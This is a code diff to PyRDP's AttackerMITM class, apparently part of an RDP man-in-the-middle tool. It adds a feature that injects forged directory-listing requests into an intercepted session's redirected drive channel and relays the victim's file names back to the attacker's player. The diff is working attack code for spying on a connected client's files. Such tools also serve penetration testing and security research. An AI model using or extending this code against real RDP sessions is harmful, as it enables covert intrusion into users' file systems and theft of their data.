@@ -4,18 +4,20 @@
 # Licensed under the GPLv3 or later.
 #
 from logging import LoggerAdapter
-from typing import Dict
+from pathlib import Path
+from typing import Dict, Optional
 
 from pyrdp.enum import FastPathInputType, FastPathOutputType, MouseButton, PlayerPDUType, PointerFlag, ScanCodeTuple
 from pyrdp.layer import FastPathLayer, PlayerLayer
-from pyrdp.mitm.DeviceRedirectionMITM import DeviceRedirectionMITMObserver
+from pyrdp.mitm.DeviceRedirectionMITM import DeviceRedirectionMITM, DeviceRedirectionMITMObserver
 from pyrdp.mitm.MITMRecorder import MITMRecorder
 from pyrdp.mitm.state import RDPMITMState
 from pyrdp.parser import BitmapParser
 from pyrdp.pdu import BitmapUpdateData, DeviceAnnounce, FastPathBitmapEvent, FastPathInputEvent, FastPathMouseEvent, \
     FastPathOutputEvent, FastPathPDU, FastPathScanCodeEvent, FastPathUnicodeEvent, PlayerBitmapPDU, \
-    PlayerDeviceMappingPDU, PlayerForwardingStatePDU, PlayerKeyboardPDU, PlayerMouseButtonPDU, PlayerMouseMovePDU, \
-    PlayerMouseWheelPDU, PlayerPDU, PlayerTextPDU
+    PlayerDeviceMappingPDU, PlayerDirectoryListingRequestPDU, PlayerDirectoryListingResponsePDU, \
+    PlayerForwardingStatePDU, PlayerKeyboardPDU, PlayerMouseButtonPDU, PlayerMouseMovePDU, PlayerMouseWheelPDU, \
+    PlayerPDU, PlayerTextPDU
 
 
 class AttackerMITM(DeviceRedirectionMITMObserver):
@@ -42,6 +44,8 @@ class AttackerMITM(DeviceRedirectionMITMObserver):
         self.state = state
         self.recorder = recorder
         self.devices: Dict[int, DeviceAnnounce] = {}
+        self.deviceRedirection: Optional[DeviceRedirectionMITM] = None
+        self.directoryListingRequests: Dict[int, Path] = {}
 
         self.attacker.createObserver(
             onPDUReceived = self.onPDUReceived,
@@ -55,7 +59,17 @@ class AttackerMITM(DeviceRedirectionMITMObserver):
             PlayerPDUType.TEXT: self.handleText,
             PlayerPDUType.FORWARDING_STATE: self.handleForwardingState,
             PlayerPDUType.BITMAP: self.handleBitmap,
+            PlayerPDUType.DIRECTORY_LISTING_REQUEST: self.handleDirectoryListingRequest,
         }
+
+    def setDeviceRedirectionComponent(self, deviceRedirection: DeviceRedirectionMITM):
+        if self.deviceRedirection:
+            self.deviceRedirection.removeObserver(self)
+
+        if deviceRedirection:
+            deviceRedirection.addObserver(self)
+
+        self.deviceRedirection = deviceRedirection
 
 
     def onPDUReceived(self, pdu: PlayerPDU):
@@ -163,3 +177,33 @@ class AttackerMITM(DeviceRedirectionMITMObserver):
 
         pdu = PlayerDeviceMappingPDU(self.attacker.getCurrentTimeStamp(), device.deviceID, device.deviceType, device.preferredDOSName)
         self.recorder.record(pdu, pdu.header)
+
+
+    def handleDirectoryListingRequest(self, pdu: PlayerDirectoryListingRequestPDU):
+        if self.deviceRedirection is None:
+            self.log.error("A directory listing request was received from the player, but the channel was not initialized.")
+            return
+
+        listingPath = str(Path(pdu.path).absolute()).replace("/", "\\")
+
+        if not listingPath.endswith("*"):
+            if not listingPath.endswith("\\"):
+                listingPath += "\\"
+
+            listingPath += "*"
+
+        requestID = self.deviceRedirection.sendForgedDirectoryListing(pdu.deviceID, listingPath)
+        self.directoryListingRequests[requestID] = Path(pdu.path).absolute()
+
+    def onDirectoryListingResult(self, requestID: int, deviceID: int, fileName: str, isDirectory: bool):
+        if requestID not in self.directoryListingRequests:
+            return
+
+        path = self.directoryListingRequests[requestID]
+        filePath = path / fileName
+
+        pdu = PlayerDirectoryListingResponsePDU(self.attacker.getCurrentTimeStamp(), deviceID, str(filePath), isDirectory)
+        self.attacker.sendPDU(pdu)
+
+    def onDirectoryListingComplete(self, requestID: int):
+        self.directoryListingRequests.pop(requestID, None)
